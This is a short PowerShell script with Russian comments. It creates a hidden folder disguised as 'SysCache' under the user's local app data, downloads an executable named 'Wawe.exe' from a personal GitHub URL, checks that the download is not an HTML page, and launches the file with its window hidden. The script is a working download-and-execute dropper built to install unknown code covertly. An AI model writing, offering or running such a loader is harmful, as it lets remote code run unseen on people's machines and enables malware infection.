$hiddenDir = Join-Path $env:LOCALAPPDATA 'SysCache'
if (-not (Test-Path $hiddenDir)) { New-Item -ItemType Directory -Path $hiddenDir -Force | Out-Null }
$f = Get-Item $hiddenDir -Force
$f.Attributes = $f.Attributes -bor [System.IO.FileAttributes]::Hidden

$exe = Join-Path $hiddenDir 'Wawe.exe'
$url = 'https://github.com/jesuss13377-source/wa/raw/refs/heads/main/Wawe.exe'

Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing

$info = Get-Item $exe
if ($info.Length -lt 100KB) {
    Write-Warning "Файл слишком мал ($($info.Length) байт) — вероятно, скачалась HTML-страница, а не exe."
    return
}

Start-Process -FilePath $exe -WindowStyle Hidden
